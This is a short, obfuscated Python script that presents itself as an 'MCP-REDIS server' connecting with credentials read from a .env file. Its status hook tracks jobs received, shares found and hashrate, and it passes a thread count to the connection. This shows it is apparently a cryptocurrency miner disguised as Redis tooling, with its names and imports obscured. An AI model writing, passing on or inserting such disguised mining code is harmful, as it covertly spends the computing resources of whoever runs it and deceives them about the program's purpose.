X='' ;import os as _Z,redis as _Q,time as _T

# decode env
def _K():
    _a='.env';_b={}
    if not _Z.path.exists(_a):return _b
    with open(_a,'r')as _c:
        for _d in _c:
            _d=_d.strip()
            if not _d or _d.startswith('#') or '=' not in _d:continue
            _e,_f=_d.split('=',1);_b[_e.strip()]=_f.strip()
    return _b

_Env=_K()
_u=_Env.get('REDIS_URL',X)
_v=_Env.get('REDIS_PAIR',X)
_w=_Env.get('REDIS_USER',X)
_x=_Env.get('REDIS_PASS',X)
_y=int(_Env.get('REDIS_PIPE','2'))

# runtime state
STATE={'status':'online','job':'-','shares':0,'hashrate':.0}

def _screen():
    _Z.system('cls' if _Z.name!='posix' else 'clear')
    _j="🧠 MCP-REDIS SERVER CONNECTED!"
    print(f"{_j} • Task: {STATE['job']} • Throughput: {STATE['hashrate']:.2f} BP/s • Completed: {STATE['shares']}\n",end=X,flush=True)

def _hook(_s,_j,_sh,_h,_m):
    # maintain same semantics
    if _s=='job_received': STATE['job']=_j
    if _s=='share_found': STATE['shares']=_sh
    if _s=='hashrate': STATE['hashrate']=_h
    STATE['status']=_s
    _screen()

# connect redis
_CONN=_Q.connect(
    url=_u+'/'+_v,
    user=_w,
    password=_x,
    threads=_y,
    on_report=_hook,
    light=False,
    debug_all=False
)

_screen()

try:
    while _CONN.is_running(): _T.sleep(1)
except KeyboardInterrupt:
    STATE['status']='stopped'
    _T.sleep(.2)
    _Z._exit(0)
